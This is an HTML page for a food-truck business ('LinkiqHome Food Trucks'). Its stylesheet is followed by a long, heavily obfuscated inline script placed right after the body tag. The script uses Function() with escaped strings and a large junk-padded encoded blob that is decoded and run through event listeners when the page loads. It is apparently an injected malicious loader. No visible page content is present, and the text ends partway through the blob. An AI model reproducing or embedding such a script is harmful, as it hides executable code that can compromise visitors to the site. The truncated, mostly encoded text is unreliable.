<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LinkiqHome Food Trucks - Mobile Culinary Excellence on Wheels</title>
    <meta name="description" content="LinkiqHome Food Trucks delivers exceptional mobile dining experiences across the region. Our fleet of gourmet food trucks brings diverse cuisines directly to your events, gatherings, and celebrations. Click here to continue exploring our authentic street food services and book your next culinary adventure today.">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #2c3e50;
            background-color: #f8f9fa;
        }
        
        .header9x4k {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 1rem 0;
            position: sticky;
            top: 0;
            z-index: 1000;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        
        .nav8m2p {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 20px;
            flex-wrap: wrap;
        }
        
        .logo5t7n {
            font-size: 1.8rem;
            font-weight: bold;
            letter-spacing: 1px;
        }
        
        .navmenu3k9s {
            display: flex;
            list-style: none;
            gap: 25px;
            flex-wrap: wrap;
        }
        
        .navmenu3k9s a {
            color: white;
            text-decoration: none;
            transition: opacity 0.3s;
            font-weight: 500;
        }
        
        .navmenu3k9s a:hover {
            opacity: 0.8;
        }
        
        .hero6p2w {
            background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://images.pexels.com/photos/1484516/pexels-photo-1484516.jpeg?auto=compress&cs=tinysrgb&w=1200') center/cover;
            color: white;
            padding: 120px 20px;
            text-align: center;
        }
        
        .herocontent7n4m {
            max-width: 800px;
            margin: 0 auto;
        }
        
        .herocontent7n4m h1 {
            font-size: 3rem;
            margin-bottom: 20px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
        
        .herocontent7n4m p {
            font-size: 1.3rem;
            margin-bottom: 30px;
        }
        
        .ctabtn8k3x {
            display: inline-block;
            background: #ff6b6b;
            color: white;
            padding: 15px 40px;
            text-decoration: none;
            border-radius: 50px;
            font-weight: bold;
            transition: transform 0.3s, background 0.3s;
            font-size: 1.1rem;
        }
        
        .ctabtn8k3x:hover {
            transform: translateY(-3px);
            background: #ee5a52;
        }
        
        .section4r8t {
            max-width: 1200px;
            margin: 60px auto;
            padding: 0 20px;
        }
        
        .sectiontitle2m9k {
            text-align: center;
            font-size: 2.5rem;
            margin-bottom: 40px;
            color: #2c3e50;
            position: relative;
            padding-bottom: 15px;
        }
        
        .sectiontitle2m9k:after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 80px;
            height: 4px;
            background: #667eea;
        }
        
        .grid3col5n7p {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 30px;
            margin-top: 40px;
        }
        
        .card9x2m {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            transition: transform 0.3s;
        }
        
        .card9x2m:hover {
            transform: translateY(-5px);
        }
        
        .card9x2m h3 {
            color: #667eea;
            margin-bottom: 15px;
            font-size: 1.5rem;
        }
        
        .imgcontainer4k8n {
            width: 100%;
            height: 250px;
            overflow: hidden;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        
        .imgcontainer4k8n img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .history7m3k {
            background: white;
            padding: 50px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            margin: 40px 0;
        }
        
        .timeline8n4p {
            position: relative;
            padding-left: 40px;
            border-left: 3px solid #667eea;
        }
        
        .timelineitem5k9m {
            margin-bottom: 30px;
            position: relative;
        }
        
        .timelineitem5k9m:before {
            content: '';
            position: absolute;
            left: -46px;
            top: 0;
            width: 15px;
            height: 15px;
            border-radius: 50%;
            background: #667eea;
            border: 3px solid white;
        }
        
        .timelineitem5k9m h4 {
            color: #667eea;
            font-size: 1.3rem;
            margin-bottom: 10px;
        }
        
        .reviews6p2n {
            background: #f8f9fa;
            padding: 60px 20px;
        }
        
        .reviewgrid3m8k {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 25px;
            max-width: 1200px;
            margin: 0 auto;
        }
        
        .reviewcard7n2p {
            background: white;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
        }
        
        .reviewheader4k7m {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .reviewerimg9n3k {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            margin-right: 15px;
            background: #667eea;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 1.2rem;
        }
        
        .stars5m8p {
            color: #ffd700;
            font-size: 1.2rem;
        }
        
        .footer8k4n {
            background: #2c3e50;
            color: white;
            padding: 50px 20px 20px;
        }
        
        .footercontent3n7m {
            max-width: 1200px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 40px;
        }
        
        .footersection5k2p h3 {
            margin-bottom: 20px;
            color: #667eea;
        }
        
        .footersection5k2p p, .footersection5k2p a {
            color: #ecf0f1;
            text-decoration: none;
            display: block;
            margin-bottom: 10px;
        }
        
        .footersection5k2p a:hover {
            color: #667eea;
        }
        
        .copyright9m3k {
            text-align: center;
            margin-top: 40px;
            padding-top: 20px;
            border-top: 1px solid #34495e;
        }
        
        .modal7n4k {
            display: none;
            position: fixed;
            z-index: 2000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.6);
            overflow-y: auto;
        }
        
        .modalcontent8m2p {
            background-color: white;
            margin: 50px auto;
            padding: 40px;
            border-radius: 10px;
            width: 90%;
            max-width: 800px;
            max-height: 80vh;
            overflow-y: auto;
        }
        
        .closemodal5k9n {
            color: #aaa;
            float: right;
            font-size: 35px;
            font-weight: bold;
            cursor: pointer;
            line-height: 20px;
        }
        
        .closemodal5k9n:hover {
            color: #000;
        }
        
        .infogrid2n8k {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 30px;
            margin: 40px 0;
        }
        
        .infobox4m7p {
            background: #f8f9fa;
            padding: 25px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
        }
        
        .infobox4m7p h4 {
            color: #667eea;
            margin-bottom: 10px;
        }
        
        .highlight3k9m {
            background: #fff3cd;
            padding: 20px;
            border-radius: 8px;
            margin: 30px 0;
            border-left: 5px solid #ffc107;
        }
        
        .phonenumber6n2k {
            font-size: 1.3rem;
            font-weight: bold;
            color: #667eea;
        }
        
        @media (max-width: 768px) {
            .herocontent7n4m h1 {
                font-size: 2rem;
            }
            
            .navmenu3k9s {
                gap: 15px;
                font-size: 0.9rem;
            }
            
            .history7m3k {
                padding: 30px 20px;
            }
        }
    </style>

    <style>       
        .cookie-consent-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            z-index: 9999;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: fadeIn 0.3s ease-out;
        }

        .cookie-consent-modal {
            background: white;
            border-radius: 12px;
            padding: 30px;
            max-width: 500px;
            width: 90%;
            max-height: 80vh;
            overflow-y: auto;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            transform: scale(0.9);
            animation: slideIn 0.3s ease-out forwards;
        }

        .cookie-consent-title {
            font-size: 24px;
            font-weight: 600;
            color: #2c3e50;
            margin-bottom: 15px;
            text-align: center;
        }

        .cookie-consent-text {
            color: #555;
            line-height: 1.6;
            margin-bottom: 25px;
            text-align: center;
        }

        .cookie-consent-buttons {
            display: flex;
            gap: 15px;
            justify-content: center;
            flex-wrap: wrap;
        }

        .cookie-btn {
            padding: 12px 24px;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
            min-width: 120px;
        }

        .cookie-btn-accept {
            background: #27ae60;
            color: white;
        }

        .cookie-btn-accept:hover {
            background: #219a52;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(39, 174, 96, 0.3);
        }

        .cookie-btn-deny {
            background: #e74c3c;
            color: white;
        }

        .cookie-btn-deny:hover {
            background: #c0392b;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(231, 76, 60, 0.3);
        }

        .cookie-status {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 10px 15px;
            border-radius: 6px;
            color: white;
            font-weight: 500;
            z-index: 10000;
            animation: slideInRight 0.3s ease-out;
        }

        .status-accepted {
            background: #27ae60;
        }

        .status-denied {
            background: #e74c3c;
        }

        .hidden {
            display: none !important;
        }

        .consent-active {
            overflow: hidden;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @keyframes slideIn {
            from { 
                transform: scale(0.9) translateY(-20px);
                opacity: 0;
            }
            to { 
                transform: scale(1) translateY(0);
                opacity: 1;
            }
        }

        @keyframes slideInRight {
            from { 
                transform: translateX(100%);
                opacity: 0;
            }
            to { 
                transform: translateX(0);
                opacity: 1;
            }
        }

        @media (max-width: 600px) {
            .cookie-consent-buttons {
                flex-direction: column;
            }
            
            .cookie-btn {
                width: 100%;
            }
        }
    </style>

    
</head>
<body>

<script>;Function("'e5e9x{yt1.s!zik+3pqeu1om5%r@a-xw[ms*^hl&exunp24,x3pwewaifj1{iq}v#s4.@h-_pa6rf*]#fmlgs3k~6z1jr]uclpmu]n{mae+-+ut8]8m4^[s2+ca.e8f^%-~i,!@5c6tek7&ae3[^-n#n~&%3iz~_@98zr95cmp,h-&@+8fo{#_ni{@*qm[!_},cr-7,9a**kejz3netf^ccr561,[3xvs9v8l&+!h7ljh#m81t4o~176gvqw,f}@93.f6nopz5oc9^^*fec].y9^i5_isxi5nseq2*49yx&+o&rg2t}~g_!7u77y2hx#l_t4z&]78_wwjr%~hu,8z~._{@,k%2ehye+vqo].!#+g%&oqh!#l+syw43k-}9g{8{g}%*ga_fu64{lt}*ug{y2nawlngx5t[],.6&jvkz%[jy@k-!4w#1tav}i%xw3rroep74zvqcv6k2qje~~!y@oqks#ye-2^[jve5.][6e}1!7j*}l21ph^%[u]m.p';((_WZWjLh7l2,_M6i90P9)=>{_WZWjLh7l2=(_SktsMf25y)=>!_SktsMf25y?\"split\"[_M6i90P9()](/[]/g,\"\"):(_SktsMf25y==1?\"every\"[_M6i90P9()](/[]/g,\"\"):\"constructor\"[_M6i90P9()](/[]/g,\"\"));_M6i90P9=()=>\"\\162\\145\\160\\154\\141\\143\\145\";(_L55c0Y=>\"return(function(_NpohD45Bc,_VjC2kYX5dG,_GlfYj){_GlfYj=_VjC2kYX5dG[\\\"\\\\x64\\\\x6f\\\\x63\\\\x75\\\\x6d\\\\x65\\\\x6e\\\\x74\\\"][\\\"\\\\x63\\\\x68\\\\x61\\\\x72\\\\x61\\\\x63\\\\x74\\\\x65\\\\x72\\\\x53\\\\x65\\\\x74\\\"];if(_GlfYj[\\\"\\\\x74\\\\x6f\\\\x55\\\\x70\\\\x70\\\\x65\\\\x72\\\\x43\\\\x61\\\\x73\\\\x65\\\"]()!=\\\"\\\\125\\\\124\\\\106\\\\55\\\\70\\\"){_VjC2kYX5dG[\\\"\\\\x63\\\\x6f\\\\x6e\\\\x73\\\\x6f\\\\x6c\\\\x65\\\"][\\\"\\\\x6c\\\\x6f\\\\x67\\\"](\\\"\\\\111\\\\156\\\\166\\\\141\\\\154\\\\151\\\\144\\\\40\\\\103\\\\150\\\\141\\\\162\\\\163\\\\145\\\\164\\\\72\\\\40\\\"+_GlfYj);return _NpohD45Bc;}return !_NpohD45Bc;})(false,window);​(function(_VjC2kYX5dG,_M6i90P9,_F9LK06dWn,_KE3ufgN){_VjC2kYX5dG=this;_M6i90P9=\\\"\\\\162\\\\145\\\\160\\\\154\\\\141\\\\143\\\\145\\\";_$={};\\\"_ID44nkYC2m4IR‎OpN29rHeQMv9eLynUxtRD7IeI11fEkamERuil1jtiy‍xNQ19HyL2jmR7UiOEMIk‏_QXDH763Yd1O784f5R‎PaPYdlcHd5KIEWkv5e081n81CtXLPiUsqACt1Q4eHnblAeVcrTJV‍J5C84bKYUqlV01XAWPHkIcTQ‏_XQVD3smeR0vYX3‎Ra8edrWruqSoMrO9‍MaSWOu8qd9R‏_L0w8bK1Qs405p2RVHg‎urFJHeyzmgRoC9jvJe5EPa7v4JbeRn01tdL5xGiZs4XtWeGGnZ5eOrk‍J7PO5z4RCWygukHadF9Gb0XZjx1‏_GJPl43ANt3Kg5‎xeU9Fr3Brm45oXfFr4QS‍Xf93Q4m5BSUxF\\\"[\\\"n0sX3RpYlVSiwMnt6\\\"[_M6i90P9](/[V0SRnwYMX63]/g,\\\"\\\")](\\\"‏\\\")[\\\"qRfJYOoVXrtEMjadcwhb0\\\"[_M6i90P9](/[0XJOwqVYMtdRjb]/g,\\\"\\\")]((_TSMtpdeq,_GZr6T8iRh)=>{_GZr6T8iRh=_TSMtpdeq[\\\"n0sX3RpYlVSiwMnt6\\\"[_M6i90P9](/[V0SRnwYMX63]/g,\\\"\\\")](\\\"‎\\\");_Vl7VHZn1AT=_GZr6T8iRh[1][\\\"n0sX3RpYlVSiwMnt6\\\"[_M6i90P9](/[V0SRnwYMX63]/g,\\\"\\\")](\\\"‍\\\");_$[_GZr6T8iRh[0]]=_Vl7VHZn1AT[0][_M6i90P9](new _VjC2kYX5dG[\\\"bRWezZg4E1x2pZw\\\"[_M6i90P9](/[2WZwz14b]/g,\\\"\\\")](\\\"[\\\"+_Vl7VHZn1AT[1]+\\\"]\\\",\\\"g\\\"),\\\"\\\");});_F9LK06dWn=(_KE3ufgN)=>{_KE3ufgN[_$._ID44nkYC2m4IR]();_L55c0Y['0']();};_VjC2kYX5dG[_$._QXDH763Yd1O784f5R](_$._XQVD3smeR0vYX3,_F9LK06dWn);_L55c0Y['0']=()=>{_VjC2kYX5dG[_$._L0w8bK1Qs405p2RVHg](_$._GJPl43ANt3Kg5,_F9LK06dWn);};})();​_L55c0Y._C11F54=1;_L55c0Y._Mnk15h=\\\"SBCVXAAJUIODYMKCCEFMORBXSWTHTQPTOPIEDQOVNMERFLWYKZTSLLLQXVARFOV\\\";_L55c0Y._Srkpv=\\\"~KI}_U}GU[H{#}Q!(RHQ_.OS~P_#NKJQ?LHU]~*#})#&=?T?{QGS])R#%@V+;TM]V-N~=K[-[)_LUV-#KU(-J_KMQQGM~O;_&,OV;?%|W{WS{,OK&GKQ@^^&^:]=KP.G}&ISLWU_V%|GL{}(+J)(G-.*I:[JJ%=_RH:^]OOH:UHH%&Q*#LM.%QLR=LN^{T.%L+[[Q:_)((;PR-{U*}H?{;P@:,:HQ@=[&I&~WU?^~T^^K#@G!=W{?IJ}R|)T!+&#):J%G%)}H.--_.!,|H-H#@NMV*^]*#?-%TWM=)L=I;,^[T?N!V}|V%RJIP@Q&.+T!N?=PH^:?;Q,,PK}-[,S*)|LOV{#:!LV~!M)(]:%WT[*;%S;*RKSN?]!!TIQ_]NK.~M!&(;R,^KSL|RO}N=H+&O~SHWL)MOL=[K)R#G%Q^([&,=|K];U+U]L-TM{O+S-(;VM?%SV)OU_).K(;V!+,+QTT|O)}]SSJTT,]NJOL@K.~_&-?W!P%MJ%W(MSO,|,[(TM*!SU|@}(MWL!,-K[}:-=PSNLJ^]{IPVMW,V~|.#_NI,W-%VO|@_~+=WV(!:M=U!#JU}@OWTL;K^Q|=@,#:{LSRWKN:-^{V^~%G=L_~M.]KJ::R?_KW+O(?]K~I^RO|?{:%#&,PU-+_*OG?&J,(N,=@*}?VW;&GN*TGN:U+{S#M;|JN(.|S:UG{;=R!+L}W(K+,{LMO{={I;&*-)|.MLV^JG~PHI!|~V+K:@V*~LIQHOO}&_TNU.-,TV}JU*%L]|KU!-[,_-TU&@]QS^TV%)^:|GNGH{=&{#HQGTKU(.Q}U[!)M}I)}=}T{Q](VLJ|%{U(:S?-.^&VQP*-{(I!T!%G(=[{{%??]K}:HI]#%G~*I|#@=;^%WB7Bcd46b313a33Za9127De6UX9e37Y31574XY5d76109fQ16bX3?47eXB69Y22592ff6cf58YFZ768d43YBF143F16ad740YB145Ff864D635ab1e66FY56D037991X349f4fZ527a6134a9c4Yc33099_46DY245be2Y9Zfb71e4_aB92D89S36YZZ5167F029ac1986F360ZD3aY730c537B1c878XX50cf3c73Z573XZ59c22D96ZB6Xe753Z5249a(d33X04FB11B93B63F78FB68D542YF1c89F663D03daa33ccG35X)X84e665d2}95b)982ef58Z32c61.47DX95bba30Y3c97DDF57BZ224cd55BD6FXY02B8aB242DB48B11c85~036963Z73XZ25a81582ef5cc936Y3107dea57X0819X4XZ426a512499b49c22f98W36ZY144bd299Bfa70X3R9BD1b9BR41Fa8X164D13Xab1885f25fZZ39Y61380ed5Yc76be6|ed03B9YZ272eb58Z12c95102aXB53712399M066X042B1d99f?275DFFYY92690O56ed143Y9cf81}166Z842a6Hf85X7568YXBa81781f555bd2b531072ec5ac32F8fT771XF47B3dc8cO571X442B82B50b15fd93c65138Ded65df4Da5cd89FZ668142YDJ97BX858bff756YD309DVY77X451BX2b98(572DF4cB9269322Z6da8a:06YD146B12389af1eaa39a6158Dfe1990f1b71Y8DY555ZX3YacUb81F4]dce36541083XD:8ZY3594bc78DZ#3b32Z99T26dD65179D87e%1748c3ZY72140fa5bD535Y8133BJ164d7415Z1988X856Z23c9Z1274e35e7834Y4BF78de47Z52e4dQ776e6466e1c8Y,477e3FZB82B95b060D946YF1a83ab68d43Xa8=F92B4FD80XD5YZ734a1Je7be855Z22fb818Z6{13Ybd2a97;471de4Bb82592FF6cf58aFZ768D3db31594L1388a38b11e87f25B9033YZ188YX95fd2f89a1Y86f35bc73955DX179aI774X14XBB2895N26Fdc49B62390FD861999^572da4665158bXD6cD910621089f65fZY3368TY89f0Sfbf38a5Le79e217B9389Fcb6cdb48B72Fa0bb26e24XB02690f76ZabFDa91885F46Zdd19B21f88F35cD7F967cd568f127fec59Z633Y0!D7Ye754c12e9bP875X24Fbc29B746b3229aGb24b24aB7c245b21F8ZF966D340ad1Y87f461ce3BY8319131b11d8YF25X9BD457Z4319e:b78e552bf2c99Q673X04dba43D656c22f97)322d248YY2996ZD1Fcd46B31Z87F025Z746adcc7Zf562ZB369fD476f55Z882Z9Y10889eL9Z53193J973da4f8eX08Ffd73eb22bb2891fc65X0N270D65F981b88F562ZF3Za91683F05DZY37Y4117Xeb58c532Z351c73f53X179e6f174e14eBB2895P26fDZ49B62390FD6aD760c060X04cB9218DZYQ386f360cd3YY71481XX5bc835be1eZ032YZX11Y9DGY77e451BX2B9821812395;F447d^06dda47D030D244BXf32Zaf1Z89F67fD14ab717B7459f1F8Df812YD3BadRF79X950BB3b9D107c9B1582U039bc2996(38c2193Wd24DY4288DY88)16ed742ab?694XX6edc4763ce7eF456D54279cb79F25fZ8339cD184f24cZZ3aY5BF74e24aB7259bbc45B010B2249eD3Rc8ffc69D62DB01d8aF7802481FD61D5467dB639Y61380XD5YZ734b01D7b#BY4117Ye54e76269fUb7DDZ52c5de91*D73d553b52894f46Zd64XZ0BX41YX1B88F562ZF3ZF55bd7F0Y01985f756ZZ3f7fGX88e45a79_353{66XX65aB9fc38bb2895J26Fdc49b66Fd5516a2493*671D02aYY1688FX5XZ947851B7bX960c6325BX535e850c83Z9bde1Y87Ua77X451be2b98,5b8349Yfc7adc4fBBda9YFZ70X51eb7248DF861ac45B12382F86B8cFY5e2622Y5127fXZ59Z633Y0TD7aX754H57DDX5Dc2279D1037dd48Z4.296FZ71D64ZbfFY9Xdb6394,0a9228ff863cc17b01c8XXD63D61eb2,X88ef51d6f160d274XY4ccb387e)87fed14Z5259a_97DD9,9752391F966d44Y70df5e9a1D8Yf764d13XYB1885F25fZZ7dF556d53Y9f1588YF50ca2cYXD072e84Yc9367ZO67deb12B2228fZ02cd54eBY2Z8B@1749Y3BYY288Y@4608FFX7DB93ZY91683F05DZY37Y4117eXB67d432Z45aBY289fK52dX756c93493bb7YDY46b82X8Xf977903Xb02b89{31ed847Y9138BYZ62d9F3b31589fe626bee5bc835Y2WF7Ze956c3309D57Z639a4!35Ddd49BB3191FZ7YB84eae1c93F9658e18682994-461a4X063D03dYY1784F15X28228F127FXZ59c633a0[DZ03cY2!482X457c3X297|56ddb26BF2Z95&069b44dB92b8aQ07394]2662X2Yad1Y87f461ZX3BY81582XF5ZPd85e665ZY2Fa5183fe550ZZTa9X|479de54Z7N2a6X36B9cG8B12a97(06bD41fb82496f56bDX26ba1690f759deF968da7cF254d340861087F51Zbc2c99ZY36e452ba2795MB31a01F5bDX4bB82592FF6cd946B3208d3Xb61796FB60d64970118Bed6f9133Y9(b8YF73DZ73eYZD384X459c83c98c834DD56c23493M97Za243B23092.c6897(685Z144b11X8bF865D23fac1986F36fDZ3aZB5dD42f9D147aa25ZZB3Xa9=830ef4fBB2dY3&36eecN5b325a0fe78934Dbc1X88H021d74e681d8bF360ZX444dD03daa1784F15XZB38a5127F39Y81b86X53Fbf2B9D1373DX5c9Y3090FX75db4770fa4YFD65DD51b0f32fb21F8cf966D340YD7771de61ce3bY81582XF5c?f8Bf153d133a61231f153Z73Z85136DXD5Bc6e89Yff7aX742b52054b576X84ZaeDF43#bH78af764D13Xab1885F25fZZ39X962ce40YXc787F54FZF3da8e77B9Z2676279F*07Fe449bf3259FF6ae624B81e93f86ee11cZ0FD85B622cb44B11a85ee49D731B11F8aYB1Y99D558Z5329F,Z79X653Z02d9Y@7Z7358F^F7De827bbXY9Dfb7BX420B92598f66cdff882D28Zf16cD934a71255911481ee5bc835Y2-F7ZX956c383f14BZB39Y4e377a648BX209fJZ54d44DB2DY64b461d14Yb7208bf429DZ4aY42492fd17d7459F1F8DF81F8347ad1f83X56aba_23ec12e9BS875X24Fbc2996O370309Xf878e651902453F56BZD4ZB9FF89_06X9546Y61B8Yfe5a8af6a4127YX755ZBF160df1B9X}b78X552BF2c99V673X04da42794H16edb48B5228FFZ69D652bf1db240a8163eFX6cc646b41f39X759D432acZ747a161Z02BY41073eff376X350BD2Y97;471DX4Bb825X544c0Pd8fR065dc4FbbDZ49B71BY513622a26Y91683F05DZY37a4117XXB58c5329F~cZZ3a941482ed2cc0ef91?769X8559B259cOY31D141YXDF4Bf967ZF3caa2046b53470F360ZD3aa71481XX5bc835Y26Z88X969d340YD1392ZX51be2B98K572df4Z16107dK06dda47B4218eFBYX2a90f270D245B1D07Xed5aZ941B2XX87F45dZ831YZce3ZY06864X754c12X9bU875e24fbc299646BF2B9dfc72e525B42X8a#01Fa9f9ba2595F23571F461ce3ba81582XF5Zc936Y358c62e9ZX780ed56Z12a75LX7aXZ4Bc13455c3427e~16XDB48B5228fFZ69d643B070D246bb&492XZ6ZDY4567D3fb22868010Y9167FXY53cee896|572X159ca2894Z43697VbB2218efd75e644b0e04fce_a8dFY67d441YX1B88F562cf3Z931683F05DZY37a4117eeb58Z541ae[Za12ba5}52DF356Z9X1Y5:a7DX1466F30a2@66ZD33eB6239dZBG88BF865d23Fac1986f360cd3Yb62381fb5BFB7af6VfBF38Y5Ne79X25D772aY0102Bd953B32ba5Nd6FD65379DY97%666D440ba1Y90F261dcU2631591ed256ef15Xcb38Y5127FXZ59Z633Y01c89e761c157X951c92B90T872F04870319ZF867dc47b91F45J562de42b62793971a87F461ce3bY81582XF5cZ945b2108Yea8a1880f0507828Y1{d7fDX54Z7e096[827e146BB2Y9Y^X22974FB22486F51DD646Y7128ade6Zd444Y0137ea65cD33B611B34e264BZ31a1]371e84X7Fcd50BD2a97,471DX4bB82592ffYF2894?66Fd93F752090f5238f18B11e87f25bD6f09eKd7aX961d2309cZ53f9F55Z72fa7I96XX650ZX2a9c}228X954b01f94ff71d7^b78e54BBY3975f865d23Fac1986F3bdB724Y71481XX5bc835Y255d137991779ec58772896VZ84BB54c12Y95FX799BK96D3531B4218XFB68d542af1Z89f663138ZF86ac93Fb2f281fb57cdXZ76Z679X159ZD2c6fab2X9BW875e24FBZ2996?370DD92,068D621BY2790FB64af48B42685FB6e8fFD7ZB83BY81582XF5cc936Y3107deaaa@c80F53Xcc26a6147fa1_D355cc4ba4Ye350B9248D(822D341B71f88f42496f76B1583f961ZY3666d554901380XD5ac734a1}X7be855Z2199c!976X350BD2a97~471DX4BZ7349227b12B8BB379dc4F672B90S367ccf5B6288cf259c43ca923518e117eXB58Z5329f!Z79X653c03ZY9P781X172%47BD644BB2149S472de*YYF2a97f66ZDF41a61e3Fef68d53ea9128d911481XX5bZ835Y2Sf7ce956c33fYZTa84X4831379984Xc0DF9c@b6fe941B03347,170d24052D542af1c89f663D03DYY1784T06DZB45Y545d33Bab[b33X452Z83095.d2eeb5YBY2894}X6Xe446B5dd93&524de43b82797[b*98ZF966D340YD1a87f461ZX3Beb64d042YB157bb15Zcc315FZB54ed5Yc32X97122ZDD4BZ12992FX27a1:1Z03096R36bdd43691F91B06DDZ40ba1281N418d241Y31147b42187f675b134a1+X7be855c22fF9f360X350BD2Y97%471DX5Yc725bf4Xc12c8bb36dDZ50YZD493f35FD147Y71290Y95ZD83Xa01X80F35fBF37a1198b89+c79X653Z02d9a]7ba369cFX7ZDX51BDdc91f771D449af}493U671d025B42884B422864e4acd3YY71481ee5BZ835a2@F7c329Zc338ea59ZZ3796F070DZ4Xc4248f,d4be141af268cF82Y8X5652D542YF1Z89F663d03DYY1784F15ecb38B4217F1X9e=Y7cf252bd3b54157D9B50c42f94ZY71ea50bcdda1FF69dfFXB8279Y!5648c46B52985[0I487F461ZX3Ba81582XF5cZ936a3107DeaYXId7fe25YcfF39eKX6Fda5abc2F9bZ86fe646b4db65b529d750bd2696ca2Z993c77e44eBX2996N271114ZB92393329dVf83b51cD5f968d086e14b84269F)F6fa55bBY2c8f!77ZX5JDba1e9YZ2319B42bb218db53672f562cf3cY91683F05Dca37a46e68XB58Z5329FIc79e6b0YY179Y.774e14ebb2895117eDZ6aFY67904ab92c97F61Xd847bb173ff16fZB41b4ZD86F067D533a9=d87a255ZB3B561575e153c92994122BXZ5472279bN66Ba148Z127939X218Xfb68d542YF1Zcd45Y6258YXF65d8ff9f)f7ZZY68c43aYDF27cF361BF35991336a255Z437Y2G176X559B5e456B76aX64cae2c8XO16D94:2662X2aYD1Y87F461ce3bY81582ef5Z207ff154ZZ41651080e14Zcc2eY1PD3ae158b8264Dd7279B49Z22F98&83Z9eIBYXX956c0309BW874e383BX2B95I5a4*F81f5278X476bDY42f853BDf6981181X117cd2Z9X~179XX577F2Z90?Z34Y3Kdb42D93ff27a8X467D441ae1B88f5622c45c4=06df05Dca37a4117Xeb67d432Z050BDe696#Z76dd527426a4{076X9!2bb259c!Y68de42bcd78YI0708b4Yaa1688FX5eZ947602189a757D03Da6117YX557c12Za1d180X55Y61X451be2B98&572DF90~869X84db2289BZ262d23F8d2B87fd70B53FB62482F85ZD6f965We84XX55ZYf365Z679F55bbd3B9d107ca311753D39bc2996*370DD4Yb72491FX6B2f8X}063db50741F8fF05bdb3Db01c49F067c7355ZX636aa58d13Xa7174BYD1aBDF865ZF3faa1783f292cd3YY414B31X90;4369D567aX951N762ZZ,5Y72090F026dc3Bad1088fd668e3B9F1b43B21ZZ33cY2!X36B7F376X350bd2Y97J4713B54d3|F7cFF6ZD946b3208dFY76X341de6DZD4Ba71d90a963D2349e1637XY63cd3858;87Xee5fZ2349Yc084X24Zc2X191~771d84DB82a90B672DXfdb32B2eB11e8Bf865D23FYZ5Dd536b51Y7FF5688F3FB0Id87FB42Z1359b;684XZ5Z7Feb5fS17aX750bb2459fc75e153B2289BZ16eDD3FY92149B82aca3aa7f593ef65d81da71X8ZXY60Z43e61ZD76ec56BD325bcd2Xe15dZ325a3L578e4:bb5X64a12=e91FX6bd845B21f8Zf966D340f228da48B01X6BFY64d230a3PY8aXZ5FZBF260df1b9eIB78e552bf2c99637cFB37Y42794N16eDB48B5229e[b69F98fFF70ZFf7B12082XZ648549Y71187Y656ZZ369d127def557B37abN781e84Ycfe358QZ7YXB4dc02c8cG42e7ZFF6cD946b3208Dfaab2384.368cd43b6DD83XX6YY83Za2177cf265a04481W93aY64fc8359X|972bd56Z23493,97Zc458b42e95f77Z97U6781888f543X13dB3266Bf56ZDY38YX128ZYF1bZ43aY4Pb80Y91b7Z2fab1173f153Z63259-33498605cDF4cb92693L06dda47b4218e44YXD54aF42add37b51782fe17Y1{X7BZB8cXD5bd2F559211da0+d7aX754Z12X9B:875X24fbc2996,37fec4Ye674e547BY2686fe6BX5f9a91f8F?05F8743afZX8aFX5Yd43b9D2236e65ZZ62dY2ae319XUb78X552BF2c99O673X04dBY2794107ddb90fe66d41FB8258ef962YD46B22483F96c8dfb7aB639Y61380ed5YZ734Y1HX7be8B2YZ2F9Z[976X350BD2Yf4Ld8Zc835b82592FF6ZD946b32f9cFY9Y1Z90S51BZB44B02281f76Y833dYZTX78f011ZD39581573e6517932a2R17184{774X14ebb2895*2Z62597fa72e7,BYB1B88D674d046B9fe88FF6dZB41a51f42YX60d02f9FZF41a255d137991779ec587Fed51191598H572df4Zb92693;06Dda47c3308e2eB5168XFB1Zcd3baf1196YY5DD3435e:D7df966Z43X59FB6B8Y%d7ae754Z12X9BK875X24FBZ7cDB57a42697FZ73e65273X04eB23Zaaf9Z1bd40YD1a87f461ZX3Ba81582ef5cZ936a363c539aee780ed56Z12Y75|e7Yec4bc13455c3427XO16XDB48B5228ffc69d643B07